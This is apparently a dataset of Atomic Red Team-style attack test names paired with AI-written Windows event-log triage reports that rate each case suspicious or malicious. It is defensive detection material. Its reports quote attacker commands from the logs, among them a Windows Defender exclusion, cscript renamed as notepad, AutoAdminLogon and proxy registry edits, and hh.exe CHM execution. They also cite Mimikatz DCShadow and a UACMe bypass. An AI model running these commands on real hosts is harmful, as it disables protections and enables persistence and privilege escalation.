   - A series of processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`) executed by user `SERVER002\admin_test` display typical command-line arguments and do not show unusual behavior for a systems administrator. These are often used tools for querying and managing Windows logs and obtaining system information.
   - A sequence of `cmd.exe` commands is observed executing registry edits that configure 'AutoAdminLogon'. These edits change system settings to automatically log in as 'Administrator' with a specific password, which could indicate an attempt to bypass login security. This behavior is suspicious and potentially malicious as it alters system security configurations without clear justification.

2. **Application Logs:**
   - The event mentions the `Software Protection Platform Service`, which is a default Windows service responsible for validating the integrity of Windows installations. No suspicious activity noted here.

3. **PowerShell Logs:**
   - No events were recorded in the provided logs, leaving no details for PowerShell activity evaluation.

4. **System Logs:**
   - The logs show minor time synchronization and general kernel activities. These are routine and benign, associated with standard system operations like time updates and do not provide any indicators of malicious activity.

5. **Security Logs:**
   - Time change events captured in logs could suggest a maneuver to alter log timestamps for evading detection, but these are in accordance with time service synchronizations, and no indication of manual tampering is noted.

**Conclusion:**
The overall activity involves legitimate system administration commands. However, the configuration of auto admin login using a known password without appropriate explanation indicates a potential security risk, possibly opening the system to unauthorized access upon reboot or logon session resets.

**Final Assessment:**
- **SUSPICIOUS** - The logs contain suspicious activity (misconfigurations that potentially weaken system security) that require further investigation. It's important to:
  - Verify whether the auto admin login changes were approved or part of an expected administrative action.
  - Investigate the context in which these commands were run, potentially involving discussions with the user `SERVER002\admin_test`.
  - Cross-check with other logs (e.g., network or VPN logs) to detect any related unauthorized access attempts or external connections around the event times."
Windows HideSCAPower Group Policy Feature,"Upon reviewing the provided logs from the Windows host, I have conducted a detailed analysis focusing on potential indicators of malicious activity:

### Analysis Summary:

#### 1. **Application Log:**
- The entries related to the `edgeupdate` service indicate a normal service stop event. These are benign as service stop and start messages are common during software updates.

#### 2. **Security Log:**
- The events with ID `4616` pertain to a system time change. These changes are logged with the command `svchost.exe`, executed under the `LOCAL SERVICE` account. Though system time change events can be indicative of attempts to tamper with system logs for covering tracks, there is no evidence of such intent here as this could be an automatic time synchronization activity.

#### 3. **Sysmon Log:**
- The logs show a series of processes executed by the user `SERVER002\admin_test`:
  - Processes such as `cmd.exe`, `wevtutil.exe`, `conhost.exe`, and `reg.exe` are used for legitimate administrative and system maintenance activities. 
  - However, the execution of `cmd.exe` to modify registry keys (`reg add`) to hide the Power button in Explorer represents a suspicious behavior as registry modifications can be used to enforce persistence or alter system settings for malicious purposes.

#### 4. **System Log:**
- Similar time change events as in the Security Log. These likely indicate a routine or automatic synchronization rather than malicious intent.

### Findings:

- The most concerning finding is the execution of a command (`cmd.exe /c reg add...`) modifying registry settings. While this could be for legitimate administrative purposes, without a defined context it remains suspicious.
- The actions are executed under a user account `SERVER002\admin_test` with high integrity level, making it capable of potentially malicious alterations if executed with malicious intent.

### Recommendation:

- **Resolution**: **SUSPICIOUS**
  
  - The registry changes executed via the command line should be investigated further to understand the context. Verify if this was a scheduled or authorized activity by the IT department or a user performing routine tasks.
  - Cross-reference with any other security tools for unusual activities involving this user or similar registry changes across systems.
  - Consider a deeper investigation or monitoring of the account `SERVER002\admin_test` and the context around its activities.

Further follow-up will ensure that potential threats or security concerns are addressed, preventing future risks to the organization."
DCShadow (Active Directory),"Upon reviewing the provided Windows event logs, I've conducted a detailed analysis focusing on process executions, command-line arguments, user accounts, and any indications of malicious activity or compromise.

### Observations:
1. **Powershell Execution (logs 18012, 18022, etc.)**: 
   - Multiple instances of `powershell.exe` were executed by the user `SERVER002\admin_test` with high integrity level.
   - The command-line arguments associated with these executions are notably suspicious, as they include PowerShell scripts exploiting `Mimikatz` and using `dcshadow` technique. The specific command shows attempts to manipulate Active Directory attributes (`badpwdcount`) using `mimikatz`.

2. **Execution of Mimikatz (logs 18014, 1100)**:
   - The logs evidence attempts to execute `Mimikatz` through PsExec and PowerShell scripts. This is a well-known legacy tool used for extracting Windows credentials and modifying security attributes, which poses a significant security risk.

3. **DCShadow Attack (Windows PowerShell log 1094–1099, 1100)**:
   - The logs explicitly indicate attempts to perform a `DCShadow` attack, which is a highly advanced way to stealthily introduce changes to Active Directory by imitating a Domain Controller. The activities connected to this in both Powershell and Sysmon logs suggest this is a vital indicator of a potential attack.

4. **Suspicious Process Names (Sysmon log)**
   - There are numerous instances of `conhost.exe`, `wevtutil.exe`, `cmd.exe`, and `conhost.exe` executions, but notably accompanied by potentially good parent processes except for those related to DCShadow and PowerShell which require further scrutiny.

5. **Legitimate Software Updates (logs 18022-18025)**
   - The logs also show the execution of legitimate processes like Microsoft Edge Updates, which are expected and not inherently concerning.

### Threats and Risks Identified:
- The presence of `Mimikatz` and `DCShadow` activity is a significant security threat. These tools indicate an effort to dump credentials and potentially manipulate Active Directory objects, which could lead to privilege escalation or unauthorized access across the network.

### Recommendation:
- Immediate isolation and forensic analysis of `Server002` is recommended.
- Conduct a thorough review of other systems for similar indicators or tools.
- Review Active Directory changes and policies around service accounts and auditing.
- Strengthen user training and awareness and reinforce policies on PowerShell and script execution.

### Resolution: 
- **MALICIOUS**: The indicators present in these logs strongly suggest malicious activity and attempted security compromise via credential extraction and directory attacks. Immediate action is warranted to contain and mitigate potential damage."
Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"Upon reviewing the Windows event logs provided for analysis, several points of interest stand out that may indicate potentially suspicious or malicious activity:

### Observations:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - `wevtutil.exe` is a legitimate Windows utility used for managing event logs. However, its frequent consecutive execution recorded in the logs without command-line details is unusual unless part of an automated task or script.
   - Similarly, `conhost.exe`, the Console Host, appears repeatedly in conjunction with `wevtutil.exe`. 

2. **Suspicious PowerShell Activity:**
   - Execution of PowerShell with a command modifying registry entries associated with Windows logon (Event ID 17982, 17983, Windows PowerShell log):
     - Modifications include setting `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword` in the registry.
     - This is a strong indicator of malicious configuration, possibly to enable automatic login with elevated privileges and is often used by attackers to maintain access to a compromised system.

3. **Execution of `HOSTNAME.EXE`, `WHOAMI.EXE`, and Related Processes:**
   - These executions appear standard for gathering system and user information, but in conjunction with the registry changes, they may be part of reconnaissance activities by an attacker.
   
4. **Execution and Update of Microsoft Edge Components:**
   - While Edge updates themselves are not suspicious, their presence amongst logs of unauthorized PowerShell use may be tangential noise.

### Assessment:
Given the observed behavior of the PowerShell script modifying sensitive logon registry keys, the activity within these logs is highly indicative of compromise. This type of behavior is congruent with known tactics for persistence, where an attacker enables automatic login to maintain access more easily after disconnecting. 

### Threats or Risks Identified:
- Unauthorized persistent access to the system by modifying registry values to enable automatic sign-in could lead to privilege escalation and persistent unauthorized control.
- Potential for data exfiltration or further network exploitation if access is consistently maintained by an attacker.

### Guidance on How to Proceed:
1. **Immediate Incident Response:**
   - Alert IT security and initiate incident response plan focusing on isolating the affected system to prevent further access.
   - Investigate network traffic and other endpoints for similar scripts or unauthorized access.
   - Review access logs and look for other signs of lateral movement within the network.

2. **Registry Recovery:**
   - Remove unauthorized registry changes related to logon credentials immediately.

3. **Root Cause Analysis:**
   - Determine how this script was introduced and executed on the system (phishing, unpatched vulnerabilities, etc.).

4. **Patch and Secure:**
   - Apply all pending patches and enforce security measures to prevent recurrence.
   - Implement least-privilege access policies, especially around domain admin credentials.

5. **Review and Strengthen PowerShell Logging:**
   - Enhance PowerShell script block logging and transcription to capture detailed command execution records for forensic purposes in the future.

### Resolution:
**MALICIOUS** - The logs contain evidence of malicious activity, specifically unauthorized registry manipulation aiming for persistent access. Immediate attention and remediation are needed to secure the compromised system."
Tamper with Windows Defender Evade Scanning -Folder,"Upon analyzing the provided Windows event logs, the following observations can be made:

### PowerShell Logs:
1. **PowerShell Command to Add an Exclusion Path**: 
   - The command line used: `powershell.exe & {$excludedpath= ""C:\\Temp"" Add-MpPreference -ExclusionPath $excludedpath}`
   - Addition of an exclusion path to the Windows Defender preferences can be a tactic used by attackers to disable antivirus checks on specific directories to avoid detection.

### Security Logs:
2. **Event ID 4624 (Logon Success)** & **4672 (Special Privileges Assigned)**:
   - Successful logons (ID 4624) were recorded for the user `admin_test` with special privileges (ID 4672) containing powerful rights such as `SeDebugPrivilege` which can allow a user to perform potentially dangerous activities on a system.
   - The logon type is `3`, indicating a network connection which is standard for remote access but can also signal potential remote command execution if not initiated by a trusted source.
   
### Sysmon Logs:
3. **Usage of `wevtutil.exe`**:
   - This utility is used to manage Windows Event logs. Its usage can be benign or can indicate log tampering attempts to hide traces of malicious activity.

4. **Multiple Usage of `conhost.exe`**:
   - `conhost.exe` is a legitimate process that acts as a command-console host. Its frequent usage may suggest scripting or automated task execution frequently, potentially in conjunction with other processes like `whoami.exe`.

5. **Edge Update Executables**:
   - A large number of events related to `MicrosoftEdgeUpdate.exe` and associated processes. This can be related to an automatic update process but correlating this with exact sysadmin or system update logs would be beneficial to rule out any misuse as a potential dropper or persistence mechanism for payloads.

### Conclusion:
The logs reveal potential signs of suspicious activity:
- The PowerShell activity to add a path exclusion might allow an attacker to bypass security on the `C:\\Temp` directory.
- Usage of `wevtutil.exe` and consecutive logon events with special privileges could indicate attempts to gather information or erase tracks.
- There are numerous entries related to system components like Edge Update, which seem to execute in a legitimate manner but high frequency should still be validated as routine system behavior.

Based on these findings:

Resolution: **SUSPICIOUS**

**Guidance to Proceed**:
1. Investigate the source of the PowerShell command that seeks to exclude `C:\\Temp` from Windows Defender scans.
2. Verify with system administrators about the specific activities and legitimacy of the administrative privileges assigned and network logon sessions for `admin_test`.
3. Cross-reference Edge and system update logs to determine if the high frequency of Edge update-related entries is normal for this environment.
4. Conduct a broader investigation into the affected host for potential indicators of compromise, such as unauthorized access/use of credentials.

Further analysis and possible containment actions may be warranted based on deeper exploration of these points."
Masquerading - cscript.exe running as notepad.exe,"Based on the provided logs, the following analysis can be conducted:

### Observations:

1. **Windows Update Activities**:
   - Several events indicate the activity of Windows Update and Microsoft Defender Antivirus updates (Event ID 44, 43, 19) in the System log. These events show routine updates related to security intelligence and appear legitimate as per their usual structure and function.

2. **Sysmon Logs**:
   - The Sysmon log mostly shows process creation events involving standard Windows utilities such as `hostname.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and processes related to system updates like `wuauclt.exe` and `MpSigStub.exe`.
   - The execution of `cmd.exe` with arguments such as `copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y` suggests an attempt to copy and execute `cscript.exe` as `notepad.exe`, which deviates from normal behavior and could suggest an obfuscation attempt or masquerading. This operation might indicate a malicious intent if executed by a non-system or unauthorized user.
   - The execution of `notepad.exe` with its file version aligning with `cscript.exe` (`Microsoft® Console Based Script Host`) under the `Roaming` directory is highly suspicious, as it suggests process masquerading.
   - The excessive use of `wevtutil.exe` to interact with event logs could indicate a reconnaissance attempt to cover tracks or exfiltrate log data.

3. **Application Log**:
   - The Application log indicates that Windows Defender is state ON, showing the security product is active.

### Suspicious/Malicious Indicators:

- Masquerading tactic observed: `cscript.exe` is renamed and executed as `notepad.exe`, which is unusual and can be a sign of malicious behavior aiming to execute scripts without raising initial suspicion.
- `cmd.exe` operations involving file copying and execution of an altered binary (`notepad.exe`) within the `AppData` roaming directory can be considered suspicious, typical of malware persistence methodology.
- While the presence of Windows Update processes is normal, the association of suspicious `cmd.exe` processes possibly using legitimate processes as parent processes could indicate misuse of these processes for malicious activities.

### Assessment:

- **Resolution**: **MALICIOUS**
  - The logs reveal an attempt at file execution masquerading and possible unauthorized script execution. This behavior is consistent with tactics used by malware to avoid detection, increase persistence, or elevate privilege. The act of copying `cscript.exe` to `notepad.exe` in the roaming profile and executing it is particularly indicative of obfuscation and potential malicious behavior.

### Guidance:

1. **Immediate Actions**:
   - Execute a detailed antivirus scan with updated signatures on `Server002`.
   - Investigate network activity for unusual connections that coincided with these events.
   - Verify the system’s integrity and check for unauthorized changes to critical system files or configurations.

2. **Further Investigation**:
   - Review additional security logs, such as audit logs, to determine if there were further unauthorized access attempts or modifications.
   - Examine user actions associated with the account `SERVER002\admin_test` to ensure this account has not been compromised.

3. **Preventive Measures**:
   - Strengthen script execution policies and monitor for unauthorized changes to script hosts.
   - Implement stricter access controls and logging to alert on similar masquerading or process execution attempts.

Taking these actions and maintaining tighter security monitoring can help protect the system from further compromises."
Set-Up Proxy Server,"**Detailed Analysis of Windows Event Logs**

Upon reviewing the provided Windows event logs across different log types (System, Security, Application, and Sysmon logs), I will focus on key elements that might indicate malicious or suspicious activities.

### System Log
- **Time Synchronization Events**: 
  - The logs show activity associated with time synchronization (`EventID: 1` and `EventID: 24` from `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`). The time change is minimal and controlled by the system process `svchost.exe` which is a legitimate Windows process.
  - **Assessment**: This activity appears normal for time synchronization, no malicious indicators present.

- **Windows Update**:
  - `EventID: 19` from `Microsoft-Windows-WindowsUpdateClient` indicates a successful update of security intelligence for Microsoft Defender Antivirus. This is standard system behavior.
  - **Assessment**: No suspicious behavior, typical of routine updates.

### Security Log
- **Logon Events**:
  - `EventID: 4624` and `EventID: 4672` indicate successful logon events with high-level privileges. The logon type `5` is for service startups, which is expected for system operations.
  - **Assessment**: Activities align with normal system operations where privileges are used by SYSTEM account.

### Sysmon Log
- **Process Creation and Execution**:
  - There are several process creation events logged by Sysmon (`EventID: 1` and `EventID: 5`), involving legitimate Windows utilities (`wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, `reg.exe`, etc.).
  - The entry for `cmd.exe` with command line arguments for modifying the Windows proxy settings is notable, as it directly interacts with the registry: `cmd.exe /c reg add ""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"" /v ProxyServer /t REG_SZ /d ""proxy.file-test.com:8080"" /f`.
  - **Assessment**: The use of `cmd.exe` to change proxy settings could indicate scripting or configuration management activity; however, this does not alone confirm malicious intent. Due to the lack of clear malicious indicators (like presence of unknown or suspicious executables, or unusual account usage), it's suspicious due to the nature of the command but not definitively malicious.

### Application Log
- **Security Product State**:
  - The presence of an event stating `Windows Defender, SECURITY_PRODUCT_STATE_ON` is reassuring for the operational readiness of the security software.
  - **Assessment**: No indication of compromise, as security products are operational.

### Summary and Final Assessment
- The logs generally display routine activities expected within a Windows environment. The only notable activity occurs in the Sysmon log where an attempt to alter proxy settings is observed. This could signal either misconfiguration or a deliberate change, often used in environments with heavy scripting or automation.
- Despite this, there is no direct evidence of malicious software execution or unauthorized remote access.
- **Resolution**: **SUSPICIOUS** - The observed registry modification needs further investigation to rule out the potential of a script or a misconfigured automation task attempting to alter system settings. Checking the originating script, intended use, and checking recent changes in scripts or policies should be a priority to mitigate any overlooked threat potential.

**Guidance**: Follow-up should include evaluating any automated scripts or jobs running on Server002, review network changes or policies that might explain the proxy modification, and ensure all security updates and monitoring are kept up-to-date. This will help either confirm a benign explanation or escalate if further threat indicators are discovered."
Registry-free process scope COR_PROFILER,"**Analysis of Windows Event Logs**

Upon reviewing the provided event logs from the Application, Windows PowerShell, Sysmon, and other channels for the Windows host Server002, several activities are observed. Here are the key points that stand out:

1. **PowerShell Activity:**
   - In the Windows PowerShell logs, there is a PowerShell command execution involving environment variables `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH`. These are being set in a script. The `COR_PROFILER_PATH` points to a DLL within a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll`.
   - Such activity is unusual and could potentially indicate an attempt to load a .NET profiler for malicious purposes. The presence of these environment variables in a PowerShell script suggests behavior that is not typical for legitimate administrative tasks and could be indicative of an initial step in an attack chain, specifically targeting .NET applications through profiling.

2. **Sysmon Events:**
   - Multiple processes are seen involving `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate tool for managing event logs, frequent invocations around the same timestamp could suggest attempts to manipulate or review these logs, potentially indicating covering tracks.
   - Another Sysmon event reveals the execution of `whoami.exe` and `hostname.exe`, which are commonly used by attackers in post-exploitation phases for environment reconnaissance.
   - The execution of various Microsoft Edge Update processes seems routine but overlaps with suspicious PowerShell activity, raising questions about the context in which these updates were being triggered.

3. **.NET Runtime Error:**
   - A .NET Runtime error is logged indicating a failure to load a profiler with a specific CLSID `{09108e71-974c-4010-89cb-acf471ae9e2c}`. This aligns with the PowerShell activity noted earlier. The `HRESULT: 0x8007007e` error indicates ""The specified module could not be found,"" which implies an incomplete or aborted attempt at malicious profiling.

**Assessment:**
The series of logs present behavior that is suspicious. The PowerShell activity, especially with environment variable manipulation for .NET profiling, alongside frequent and potentially unnecessary calls to system utilities raises red flags. Such patterns warrant a deeper investigation to rule out or confirm malicious intent specifically regarding why profiling is being activated potentially by a non-coherent DLL.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Conduct a Threat Hunt:**
   - Investigate the origin and purpose of the PowerShell script that sets the profiler-related environment variables.
   - Verify the existence and legitimacy of the DLL `data.012x64.dll` in the Temp directory. Check its hash against known malicious signatures.
  
2. **Monitor and Audit:**
   - Increase monitoring on this host for any unusual processes and network connections, particularly those associated with `admin_test` or PowerShell activities.

3. **Review Access Logs:**
   - Check for any unauthorized or anomalous logins or access patterns to verify the integrity of the `admin_test` account activities.

4. **Restore and Secure:**
   - If further investigations uncover malicious activities, consider isolating the host for thorough inspection and restoring it from a secure backup.
   - Ensure all endpoints in the environment have up-to-date security patches and endpoint detection and response (EDR) systems actively monitoring for behavior similar to what has been observed.

Given the potential implications, it's prudent to analyze further before jumping to conclusions, as the workflow could be leveraged legitimately in development environments, albeit indicative of a higher-than-normal risk."
Dynamic API Resolution-Ninja-syscall,"Upon reviewing the provided event logs for Server002, several items stand out that indicate potentially suspicious activity. Here's a breakdown of the analysis:

### Summary of Observed Activities:

#### System Logs:
- The system logs show standard Windows Update and Security Intelligence Updates for Microsoft Defender Antivirus which appear legitimate and part of regular system maintenance.

#### Windows PowerShell Logs:
- A PowerShell script executed with a command to launch a potentially suspicious executable `ninja_syscall1.exe` from a temporary directory path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\`.
- The same script checks for a log file `hello.log` in a directory meant for default user data and deletes it. This behavior could suggest attempts to clean up traces of activity.

#### Security Logs:
- The events described correspond to unsuccessful credential validation attempts, which can often represent potential attempts to access or misuse accounts with existing stored credentials. The repeated failures with return code `3221226021` (STATUS_ACCOUNT_DISABLED) suggest it concerned a disabled account or possibly non-existent credentials.

#### Sysmon Logs:
- The logs reveal that a series of executions were performed using `wevtutil`, `ninja_syscall1.exe`, and `PowerShell`. These activities triggered by a user account `admin_test` show signs of manual activity possibly indicative of misuse or exploitation.
- `ninja_syscall1.exe` does not provide detailed metadata and is executed from a non-standard location, which can be indicative of a malicious or unauthorized tool.
- Execution of utilities like `taskhostw.exe`, `wuauclt.exe`, and `MpSigStub.exe` aligned with expected system updates and maintenance tasks. However, the `wevtutil` usage warrants further examination because it's commonly used to alter or clear event logs, which is a tactic often employed by attackers to cover their tracks.

### Assessment:

1. **PowerShell Activity**: The use of PowerShell to start an unidentified executable in a temporary folder is suspicious. This tends to be a technique employed by malicious actors to carry out payload execution stealthily.

2. **`ninja_syscall1.exe` Execution**: The unknown executable raises red flags especially since its execution seems programmatically controlled and executed from a standard PowerShell command.

3. **`wevtutil` Utilization**: Frequent launches of `wevtutil.exe` may suggest attempts to manipulate or extract event logs, which can be used by attackers to either clear logs or export data for exfiltration without raising alarms.

### Conclusion and Recommendation:

Based on the suspicious PowerShell execution, the unknown nature of the `ninja_syscall1.exe` binary, and potential misuse of administrative tools like `wevtutil`, the activity reported in the logs aligns more closely with malicious behavior rather than benign system or administrative tasks.

**Resolution: MALICIOUS**

**Recommended Actions:**
1. Isolate Server002 from the network to prevent any further unauthorized access or damage.
2. Conduct a file scan and analysis of `ninja_syscall1.exe` to determine its origin and functionality.
3. Investigate the account and activities of `admin_test` to determine if it has been compromised.
4. Review system logs for any other potentially unauthorized access or changes around the time of these events.
5. Increase monitoring and potentially deploy a threat hunting activity across the network to identify any spread or further use of the malicious toolsets.
6. Consider restoring from a known clean backup after a thorough investigation and removal of any detected threats."
Delete a single file - Windows PowerShell,"Upon reviewing the provided logs, a few points of interest stand out:

1. **PowerShell Execution**: 
   - The PowerShell logs indicate the execution of a PowerShell script with the command `powershell.exe & {Remove-Item -path $env:TEMP\\deleteme_data.004}`. This command is used to delete a file from the temporary directory. The specific action of file deletion in the `TEMP` directory could be indicative of a cleanup operation after a script or program execution, which might be part of either a legitimate cleanup process or an attempt to remove traces of malicious activity.

2. **Sysmon Logs**:
   - The frequent invocation of system utilities like `conhost.exe`, `hostname.exe`, `whoami.exe`, and `wevtutil.exe` by the `admin_test` user is captured. While these are legitimate Windows processes, they are often used in conjunction with other activities during a compromise (e.g., privilege escalation, reconnaissance).
   - The presence of multiple PowerShell executions and the command indicating a file removal could align with potential attempts to pivot within the system or clean up after running certain commands.
   - The extensive number of entries related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) suggest that updates were processed around the same time, which aligns with benign software update behavior.

3. **Application Log**:
   - The application log shows a service stating that it was stopped, specifically mentioning an ""edgeupdate"" service. This could relate to the Microsoft Edge processes noted in the Sysmon logs.

**Assessment**:
- The logs contain mixed activity; while some events like Microsoft Edge updates and the Software Protection Platform messages seem benign, other entries raise potential concerns. Specifically, PowerShell's deletion command executed by `admin_test` and the frequent use of system utilities could be suspicious if not part of known scheduled tasks or legitimate administrative actions.
  
**Resolution**: **SUSPICIOUS**

**Guidance**:
1. **Further Investigation**: 
   - Verify the legitimacy of the PowerShell command and confirm if it aligns with any known scripts or administrative tasks. 
   - Check the origin and intent of the `admin_test` user activity to ensure it is part of legitimate administration.
   - Review change management records for scheduled Microsoft Edge updates at the provided timestamps.

2. **Monitoring and Response**:
   - Implement enhanced monitoring of PowerShell commands and administrative user actions on `Server002`.
   - Consider deploying endpoint detection and response (EDR) solutions to catch any further anomalous behavior.

3. **User Confirmation**:
   - Reach out to the responsible team/user (e.g., admin_test) to confirm if the observed actions were planned and have a legitimate business context.

Conclusively, the activity is not definitively malicious but warrants more thorough investigation to rule out any hidden threats or unauthorized use."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"Upon reviewing the logs provided, here's a comprehensive analysis of the observed events:

### System Log Analysis:
- **Time Adjustments:** The system log captures changes to the system time (`EventID 24` and `EventID 1`). Notably, `svchost.exe` is responsible for these changes. While this process is common for Windows services, frequent time adjustments, especially within a short timeframe, may indicate unauthorized modifications though it can also be a result of legitimate administrative activities or synchronization errors. The `Microsoft-Windows-Time-Service` log shows interactions with `time.windows.com`, which is standard for time synchronization.
  
### Application Log Analysis:
- **Edge Updates:** The `edgeupdate` service is recorded as starting and stopping, which may be part of regular update cycles for Microsoft Edge. There is an `EventID 16384` from `Microsoft-Windows-Security-SPP` pertaining to the `Software Protection Platform Service`, which manages digital licenses and activation and is benign if triggered by valid activities.

### Sysmon Log Analysis:
- **Process Executions:** The logs exhibit numerous executions of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and related Microsoft executables. Notably, the following suspicious command was recorded:
  - **Registry Modifications via `cmd.exe`:** The command `cmd.exe /c reg add ...` indicates registry modifications involving `Internet Settings ZoneMap`, which could potentially be malicious if not authorized. Manipulating these registry keys can alter security settings and warrant further investigation.
- **Edge Update Activity:** There is frequent activity around `MicrosoftEdgeUpdate.exe` and its components, reflecting update operations of Edge which match the application log.

### Security Log Analysis:
- **Time Change Events:** The `Security` logs mirror the `System` logs with `EventID 4616`, displaying changes to system time by `svchost.exe`. This is a normal process but repetitive or unauthorized changes might need validation depending on the context.

### Conclusion:
- **Benign vs Suspicious vs Malicious:** 
  - The routine execution of Microsoft Edge update components is generally benign.
  - The frequent system time changes ask for further context about administrative tasks or policies in place.
  - The presence of registry modifications, executed via `cmd.exe`, without a clear legitimate justification, elevates concerns regarding potential unauthorized changes.

### Recommendation:
- **Resolution:** **SUSPICIOUS**
- Further Investigation:
  1. **Verify Time Changes:** Examine if time changes align with scheduled tasks or if any policy justifies them. Confirm they weren't executed by unauthorized users.
  2. **Confirm Registry Changes:** Investigate the rationale behind the registry modifications and verify if they align with administrative tasks or software requirements.
  3. **Review `svchost.exe` Instances:** Inspect if the specific `svchost.exe` processes have legitimate tasks associated with them, consulting security tools for deeper insights if necessary.
 
Given these observations, while many logged events can be consistent with typical operations, certain activities — specifically the registry edits — demand closer inspection to rule out or confirm malicious intent."
Invoke CHM with Script Engine and Help Topic,"### Analysis of Windows Sysmon and PowerShell Logs

#### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:** 
   - There is an execution of PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) by the user `admin_test` on `Server002` with a potentially malicious script embedded in its command line. The command:
     ```powershell
     powershell.exe & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm}
     ```
     suggests the script is attempting to execute `Invoke-ATHCompiledHelp`, potentially using `hh.exe`, a known technique for code execution.

2. **Frequent Use of System Utilities:**
   - Several executions of `wevtutil.exe` and `conhost.exe` are noted. While `conhost.exe` is part of typical console operations, the frequent use of `wevtutil.exe` may indicate log manipulation or query actions, which can be indicative of an attacker trying to cover tracks.

3. **Execution of System Commands:**
   - The execution of `whoami.exe` and `hostname.exe` can signify enumeration activities attempting to gather information about the host's user context and network status.

4. **Microsoft Edge Update Behavior:**
   - The log entries show a series of Microsoft Edge installations and updates initiated from setup executables within transient directories (`EDGEMITMP_B9A3F.tmp`). While the install and update processes themselves are typical, monitoring the transient directories suggests possibly manipulative behavior if not standard procedure.

#### Indicators of Malicious Activity:

- **PowerShell Script Execution:** The specific PowerShell command aiming to use `Invoke-ATHCompiledHelp` is often associated with exploiting Help (.chm) files to execute malicious scripts, which is a red flag in this context.
  
- **Persistence or Execution via hh.exe:** The use of `hh.exe` to execute scripts (`through .chm file paths`) is a well-known method for executing scripts without triggering many traditional detection mechanisms.
  
- **Potential Obfuscation or Log Evasion:** The abnormal frequency and apparently purposeless execution of system utilities like `wevtutil.exe` can suggest evasion attempts, where logs might be modified or queried to ensure malicious activities remain concealed.

### Assessment:

Based on the above analysis, there are several indicators of potentially malicious activity within the logs. Most notably, the use of PowerShell with an unusual command to leverage `hh.exe` indicates possible malicious script execution. Furthermore, the pervasive execution of utility tools like `wevtutil.exe` and multiple instances of system command executions imply suspicious behavior consistent with system reconnaissance, persistence, or an active post-exploitation phase.

### Resolution:

- **MALICIOUS** - With the combination of potentially harmful PowerShell commands, unconventional execution paths, and repeated use of system utilities like `wevtutil.exe`, the logs indicate possible malicious activity.

### Guidance on How to Proceed:

1. **Forensic Analysis:**
   - Conduct a deeper forensic analysis of the host Server002, focusing on PowerShell execution history and the execution context of `hh.exe` for unauthorized activity.

2. **Isolation and Monitoring:**
   - Isolate the affected systems to prevent lateral movement and further potential exploitation within the network.
   - Monitor PowerShell logs and any scripts or processes that leverage `hh.exe` or other unusual system utilities.

3. **Threat Mitigation:**
   - Engage in patch management and ensure all security updates are deployed, especially around components like PowerShell, that are frequently targeted tools.
   - Enhance endpoint detection and response (EDR) capabilities to identify, alert, and block similar malicious behaviors in the future.

4. **Incident Response:**
   - Initiate an incident response playbook to further examine and remediate any existing compromise, ensuring all backdoors or persisted malicious code are eradicated.

5. **Security Awareness Training:**
   - Educate administrative users on recognizing anomalies in system performance and unauthorized script execution to foster a proactive security environment."
UACME Bypass Method 31,"After analyzing the provided logs, I have identified a series of events that merit closer inspection, particularly related to potential indicators of suspicious behavior:

1. **UAC Bypass Tool - UACMe (31 Akagi64.exe):**
   - The Sysmon logs reveal the execution of a command involving ""Akagi64.exe,"" found in the directory path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\31 Akagi64.exe`. UACMe is a well-known tool for bypassing User Account Control (UAC) in Windows, which can be used for privilege escalation.
   - The command is executed using `cmd.exe`, and the parent process is `wsmprovhost.exe`, which is suspicious as it often shouldn't be linked with such actions.
   - The hash of `cmd.exe` execution is listed: `SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`. This should be cross-referenced with known hashes for malicious files.

2. **Frequent Execution of Microsoft Edge Update:**
   - The logs show frequent executions of `MicrosoftEdgeUpdate.exe` with various command-line arguments and paths, including temporary directories. While routine update tasks can be expected, the number and frequency, along with paths in temporary directories, might suggest something unusual, possibly involving automation or hijacking of the update process.
   
3. **Service and Command Line Executions with High Integrity:**
   - Multiple `cmd.exe` and `conhost.exe` executions are noted with ""High"" integrity levels. These should be examined to ensure they align with typical or expected user or system behavior.

4. **Miscellaneous Observations:**
   - Execution of other system binaries (e.g., `whoami.exe`, `hostname.exe`) in the context of certain processes. Though common, combined with other activities, they might suggest reconnaissance behavior.

Given the presence of Akagi64.exe associated with potential UAC bypass activities, which is a well-documented method of bypassing Windows security features, the log entries raise significant concerns.

### Assessment and Recommendation:

- **Resolution**: **MALICIOUS**
  - The identified command involving Akagi64.exe and the context of the execution presents strong indicators of an attempted exploit to bypass UAC. 

- **Next Steps**:
  1. **Immediate Containment**:
     - Isolate the affected system (Server002) from the network to prevent potential lateral movement or data exfiltration.
  
  2. **Investigation & Analysis**:
     - Conduct a detailed forensic analysis of the affected host to identify any additional malicious files or indicators of compromise that may not be captured in logs.
     - Cross-reference the hash of Akagi64.exe and other file executions against databases of known malware.

  3. **Remediation**:
     - Remove any identified malicious files or processes.
     - Review and strengthen UAC settings and related policies to mitigate bypass risks.
  
  4. **Monitoring and Review**:
     - Enhance monitoring on similar systems for any signs of similar activities.
     - Conduct a review of account privileges on the network to ensure adherence to the principle of least privilege.

